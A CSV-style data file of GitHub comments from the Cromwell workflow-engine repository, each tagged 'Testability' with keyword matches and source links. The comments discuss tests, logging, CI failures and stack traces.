Testability,"Added a bunch of new tests which are now passing. Despite what GitHub says, `JsonEditor.scala` actually should get reviewed but the `.json` files are mostly uninteresting test data.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5324#issuecomment-566274833:21,test,tests,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5324#issuecomment-566274833,2,['test'],"['test', 'tests']"
Testability,"Added a test for WdlMap, will add another one for WdlArray in the other PR; EDIT: Actually the WdlArray part can't easily be unit tested because it involves verifying JesOutputs coercion and gcs paths..; There is a test workflow in Tyburn to test just that though. It was in the ""knownbroken"" folder, I'll make a PR to move it to the ""workflows"" folder.; Also since this PR fixes both bugs I'll delete the other one and we can only merge this one.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/263#issuecomment-153060693:8,test,test,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/263#issuecomment-153060693,4,['test'],"['test', 'tested']"
Testability,"Added a test, it doesn't really test the full bug fix but at least that we throw `CromwellFatalException`s when a retry exhausts all its tries.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/386#issuecomment-172091472:8,test,test,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/386#issuecomment-172091472,2,['test'],['test']
Testability,Added some tests. @geoffjentry I think these unit tests are comprehensive enough without (re-)testing that Cromwell wires variables into engine functions correctly in centaur. Hope you agree?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2422#issuecomment-314415451:11,test,tests,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2422#issuecomment-314415451,3,['test'],"['testing', 'tests']"
Testability,Added testing as well. @cjllanwarne could you remove the back with originator label? Thanks!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4405#issuecomment-440637737:6,test,testing,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4405#issuecomment-440637737,1,['test'],['testing']
Testability,"Added the test I complained about not having earlier, though lots of tests will fail until #323 lands.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164524852:10,test,test,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164524852,2,['test'],"['test', 'tests']"
Testability,"Adding on to this PR... a third (!) variant that is more recent [(Slack link)](https://broadinstitute.slack.com/archives/CBJJ7U293/p1709148881267919) and ended up being an array issue. I think we understand the pattern at this point so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:257,test,test,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174,1,['test'],['test']
Testability,"Adding this case to `string_escaping.wdl`, we see; ```; ScalaTestFailureLocation: wdl.draft3.transforms.ast2wdlom.WdlFileToWdlomSpec at (WdlFileToWdlomSpec.scala:44); org.scalatest.exceptions.TestFailedException: Failed to create WDLOM:; Unrecognized token on line 12, column 26:. String quote = "" \"" ""; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4500#issuecomment-448275384:192,Test,TestFailedException,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4500#issuecomment-448275384,1,['Test'],['TestFailedException']
Testability,"Additional info since the time this issue was filed: Alibaba's [Batch Compute service (BCS) is now available in the US](https://www.alibabacloud.com/help/doc-detail/61360.htm?spm=a2c63.l28256.a3.23.194f25719KjP66). This helps test Cromwell-in-the-US-using-DockerHub, but for CN users the above issues still need to be addressed, including figuring out a way for to check hashes from OSS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3518#issuecomment-399762138:226,test,test,226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3518#issuecomment-399762138,1,['test'],['test']
Testability,"Additionally, I really miss the logging 88 eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7568#issuecomment-2405624738:32,log,logging,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7568#issuecomment-2405624738,2,['log'],['logging']
Testability,"Addressed by #1456, that _should_ have made things better, but technically not yet verified / regression tested",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254578204:105,test,tested,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254578204,1,['test'],['tested']
Testability,"After being able to do some testing with a collaborator that is able to reproduce the problem, I was able to gather that:; - `script-epilogue = ""sleep 5 && sync""` worked; - `script-epilogue = ""ls -l stdout stderr && sync""` worked; - `script-epilogue = ""ls && sync""` failed. with the `ls -l` suggestion coming from [here](https://stackoverflow.com/questions/3204835/ensure-that-file-state-on-the-client-is-in-sync-with-nfs-server). I am guessing here that `tee` might not be writing to stdout/stderr fast enough and by the time the `sync` command (which is what `script-epilogue` is set to default) is run, the stdout/stderr file might still be incomplete. So if I understand this correctly, while this is related to an NFS synchronization problem, it is not strictly an NFS synchronization problem but rather a synchronization problem between `tee` and `sync`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169:28,test,testing,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169,1,['test'],['testing']
Testability,"After further testing, I now think the actual issue is the `defined()` built-in function [does not match the spec](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#boolean-definedx). I'm inclined to think this is a bug, because if Cromwell is intended to deviate from the spec, then womtool should pick up on it. https://github.com/broadinstitute/cromwell/issues/7201",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7194#issuecomment-1672100650:14,test,testing,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7194#issuecomment-1672100650,1,['test'],['testing']
Testability,"After reviewing cromwell code with Dan, we think that it's OK to downgrade the log level of **WorkflowFailedResponse** event in **WorkflowManagerActor** to INFO so it won't propagate to Sentry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5065#issuecomment-511462544:79,log,log,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5065#issuecomment-511462544,1,['log'],['log']
Testability,"After the changes above, I believe the various Specs should run as expected:; - `sbt alltests:test`; - `sbt notests:test`; - `sbt nodocker:test`; - `sbt dbms:test`; - `sbt integration:test`; - etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/558#issuecomment-196466681:94,test,test,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/558#issuecomment-196466681,5,['test'],['test']
Testability,AfterAll.liftedTree1$1(BeforeAndAfterAll.scala:213); at org.scalatest.BeforeAndAfterAll.run(BeforeAndAfterAll.scala:210); at org.scalatest.BeforeAndAfterAll.run$(BeforeAndAfterAll.scala:208); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.org$scalatest$FlatSpecLike$$super$run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.FlatSpecLike.$anonfun$run$1(FlatSpecLike.scala:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:4395,Test,TestFramework,4395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,2,['Test'],['TestFramework']
Testability,"Again 2779. ```; java.lang.AssertionError: assertion failed: received unexpected message RealMessage(ServiceUnreachable,TestActor[akka://TestSystem-a47da50b-5587-413b-bbc6-4773a965cb41/user/$$i]) after 0 millis; at akka.testkit.TestKitBase.expectNoMsg_internal(TestKit.scala:696); at akka.testkit.TestKitBase.expectNoMessage(TestKit.scala:661); at akka.testkit.TestKitBase.expectNoMessage$(TestKit.scala:660); at akka.testkit.TestKit.expectNoMessage(TestKit.scala:896); at cromwell.core.actor.RobustClientHelperSpec.$anonfun$new$7(RobustClientHelperSpec.scala:140); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.core.actor.RobustClientHelperSpec.withFixture(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680); at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.FlatSpecLike.runTest(FlatSpecLike.scala:1692); at org.scalatest.FlatSpecLike.runTest$(FlatSpecLike.scala:1674); at cromwell.core.actor.RobustClientHelperSpec.runTest(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.$anonfun$runTests$1(FlatSpecLike.scala:1750); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.sca",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-454822183:27,Assert,AssertionError,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-454822183,16,"['Assert', 'Test', 'assert', 'test']","['AssertionError', 'TestActor', 'TestKit', 'TestKitBase', 'TestSystem-', 'assertion', 'testkit']"
Testability,"Again, may be discussed elsewhere, but I'd love to see more tests, even commented out, or auto-skipped if a JES config doesn't exist locally. I'm not going to penalize this story though, and will leave it to the tech debt building up in DSDEEPB-828.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/112#issuecomment-124131947:60,test,tests,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/112#issuecomment-124131947,1,['test'],['tests']
Testability,"Agree with @cjllanwarne it would be preferable to log at debug, can this be overridden on the command line to specify debug-level logging rather than requiring changes to logback.xml?. :+1: delta this issue and moving the line where the logging is happening",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/507#issuecomment-193371025:50,log,log,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/507#issuecomment-193371025,4,['log'],"['log', 'logback', 'logging']"
Testability,"Agree with @mcovarr that this functionality wasn't already tested, and other comments about being premature regarding the `parent`. Still its absolutely in the right direction. I give it a :+1: for merging to `develop` as we're going to have more and more cross talk of committed code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/143#issuecomment-133449393:59,test,tested,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/143#issuecomment-133449393,1,['test'],['tested']
Testability,"Ah I see thank you @cjllanwarne , I do not remember exactly where I got the idea that confused me, somewhere in the logs. But probably I was misunderstanding. Thank you.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-492495446:116,log,logs,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-492495446,1,['log'],['logs']
Testability,Ah! you mean evolve the timing diagram logic to group execution events?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4162#issuecomment-425201914:39,log,logic,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4162#issuecomment-425201914,1,['log'],['logic']
Testability,"Ah, good call! I found the documentation for it: https://cromwell.readthedocs.io/en/develop/Configuring/#io. I'll have to test if it applies to AWS. Hopefully it does",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436887998:122,test,test,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436887998,1,['test'],['test']
Testability,"Ah, if it's a local sregistry, then the build limits are not the same, and Singularity Hub isn't incurring any charges on Google Cloud :) . Carry on!. Are you running a local sregistry? I put in a PR today to add a keystore, in case you want to test it out :) https://github.com/singularityhub/sregistry/pull/235",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537243005:245,test,test,245,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537243005,1,['test'],['test']
Testability,"Ah, oh well, thanks for the second set of eyes. https://github.com/broadinstitute/cromwell/commit/2682c001d99823098e655acd1dd7a3062a68f495 has your change implemented with some ~nasty~ reflection that hopefully the rest of the DSP-Batcher's will accept, and the test re-enabled. CI running here to see if it breaks anything:; https://travis-ci.com/broadinstitute/cromwell/builds/116462548. Assuming this works, I think the changes will pass all of our existing unit and integration tests!. We can get two others to review. I should abstain due to our collaboration on the code. 😉",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504500160:262,test,test,262,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504500160,2,['test'],"['test', 'tests']"
Testability,"Aha ... I think I found what you need (**NB** I'm not in a position to actually test these theories right now, YMMV and all that). In your **Cromwell** config, look at the field `aws.region`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493272139:80,test,test,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493272139,1,['test'],['test']
Testability,Aha! It's tabs in command blocks that are the issue. My test case (above) conveniently does not have a command block.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051#issuecomment-417680093:56,test,test,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051#issuecomment-417680093,1,['test'],['test']
Testability,"Aha, [a week ago](https://github.com/common-workflow-language/common-workflow-language/commit/915d49f8fb912774cbf5cbe6ba910a430ef69941) 100% of tests were moved under the `v1.0` directory. So this ""fix"" should now work!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2994#issuecomment-349461963:144,test,tests,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2994#issuecomment-349461963,1,['test'],['tests']
Testability,"Aha. So maybe we can just default in our own Noop DSN to silence the error. ToL: The lack-of-a-DSN-message is also [Logback adjacent](https://docs.sentry.io/clients/java/modules/logback/#usage). Someday I'll figure out how the hell to use logback/Joran. On first glance it looks a lot like HOCON's embedded default `application.conf` that can be overriden via `-Dconfig.file=…` except one is supposed to use [`-Dlogback.configurationFile=…`](https://logback.qos.ch/manual/configuration.html#configFileProperty). But while I ""get"" HOCON's mechanics I do not yet ""get"" best practices for logback [overrides/includes](https://stackoverflow.com/a/23737143/3320205).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3620#issuecomment-389034690:116,Log,Logback,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3620#issuecomment-389034690,5,"['Log', 'log']","['Logback', 'logback']"
Testability,"Ahha, that is useful information. I think this WDL didn't work for multiple reasons. Is there a simple example WDL or test that uses declarations in a scatter?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-285378599:118,test,test,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-285378599,2,['test'],['test']
Testability,Ahhh I remember asking myself why no test failed when I changed this log message.; Those test should be fixable easily,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3375#issuecomment-371351341:37,test,test,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3375#issuecomment-371351341,3,"['log', 'test']","['log', 'test']"
Testability,"Alas, tests continue to time out, just like last week..",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5297#issuecomment-558852164:6,test,tests,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5297#issuecomment-558852164,1,['test'],['tests']
Testability,"All Travis sub-builds that actually do anything are instafailing with messages like those below. These sub-builds have been broken like this since last week so I suspect this may be tied to CircleCI-inspired key rotations. ```; sudo: /etc/init.d/mysql: command not found; sudo: /etc/init.d/postgresql: command not found; Archive: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault.zip; inflating: /home/travis/build/broadinstitute/cromwell/target/ci/resources/vault ; Error writing data to auth/approle/login: Error making API request.; URL: PUT https://clotho.broadinstitute.org:8200/v1/auth/approle/login; Code: 400. Errors:; * invalid secret id; The command ""src/ci/bin/test.sh"" exited with 2.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152:521,log,login,521,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1380695152,3,"['log', 'test']","['login', 'test']"
Testability,All Tyburn tests pass for this branch.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/561#issuecomment-197287172:11,test,tests,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/561#issuecomment-197287172,1,['test'],['tests']
Testability,All centaur tests passed! 💯 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1013/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1013#issuecomment-226878436:12,test,tests,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1013#issuecomment-226878436,1,['test'],['tests']
Testability,"All fixed -- see https://github.com/broadinstitute/mock-jes/pull/1. Since this only works when deployed to App Engine, I've deployed it to our ""mock production"" there and ran 50 workflows... only the /batch endpoint is invoked and everything seems to be working properly",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1571#issuecomment-257118745:51,mock,mock-jes,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1571#issuecomment-257118745,2,['mock'],"['mock', 'mock-jes']"
Testability,All fixed and squashed. Will merge once tests pass unless someone else has comments before then,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/770#issuecomment-217264157:40,test,tests,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/770#issuecomment-217264157,1,['test'],['tests']
Testability,All the Centaur tests I've tried fail for this reason. Can has prioritization?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/962#issuecomment-224111388:16,test,tests,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/962#issuecomment-224111388,1,['test'],['tests']
Testability,Allows for removal of dependency on backend in the various *logs and metadata endpoints. Be careful with how this impacts hashing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/430#issuecomment-181537885:60,log,logs,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/430#issuecomment-181537885,1,['log'],['logs']
Testability,"Alpha test looks good, plan is using `METADATA_WORKFLOW_IDX` on `METADATA_ENTRY`. Actually deleting rows (on an alpha clone) completes in 100-200ms for small workflows. This is an `EXPLAIN` in IntelliJ, exported as an HTML table – apparently you can just paste HTML into Github and it works! . <!DOCTYPE html>; <html>; <body>; <table border=""1"" style=""border-collapse:collapse"">; <tr><th>id</th><th>select_type</th><th>table</th><th>type</th><th>possible_keys</th><th>key</th><th>key_len</th><th>ref</th><th>rows</th><th>Extra</th></tr>; <tr><td>1</td><td>SIMPLE</td><td>WORKFLOW_METADATA_SUMMARY_ENTRY</td><td>index_merge</td><td>UC_WORKFLOW_METADATA_SUMMARY_ENTRY_WEU,IX_WORKFLOW_METADATA_SUMMARY_ENTRY_RWEU</td><td>IX_WORKFLOW_METADATA_SUMMARY_ENTRY_RWEU,UC_WORKFLOW_METADATA_SUMMARY_ENTRY_WEU</td><td>303,302</td><td>NULL</td><td>2</td><td>Using union(IX_WORKFLOW_METADATA_SUMMARY_ENTRY_RWEU,UC_WORKFLOW_METADATA_SUMMARY_ENTRY_WEU); Using where</td></tr>; <tr><td>1</td><td>SIMPLE</td><td>METADATA_ENTRY</td><td>ref</td><td>METADATA_WORKFLOW_IDX</td><td>METADATA_WORKFLOW_IDX</td><td>767</td><td>cromwell.WORKFLOW_METADATA_SUMMARY_ENTRY.WORKFLOW_EXECUTION_UUID</td><td>73</td><td>Using where</td></tr></table>; </body>; </html>",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5206#issuecomment-539718371:6,test,test,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5206#issuecomment-539718371,1,['test'],['test']
Testability,"Alpha testing results. **Before:**. Mean = 6 failures, stdev = 10. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/978/ (32 total failed workflows, 1 hr 1 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/979/ (1 total failed workflows, 55 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/984/ (2 total failed workflows, 1 hr 5 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/988/ (15 total failed workflows, 1 hr 40 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:6,test,testing,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,1,['test'],['testing']
Testability,"Alright, would you prefer to expose it as a workflow (or Cromwell) option? Something like `monitoring_image` and if it's not defined, then the action is skipped. This way, one can also use an alternative image with their custom logic (incl. other monitoring APIs).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451511789:228,log,logic,228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451511789,1,['log'],['logic']
Testability,"Also have this error, using Cromwell 52, installed using this manual : . https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. logs say : fetch_and_run.is is a directory.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-747587937:177,log,logs,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-747587937,1,['log'],['logs']
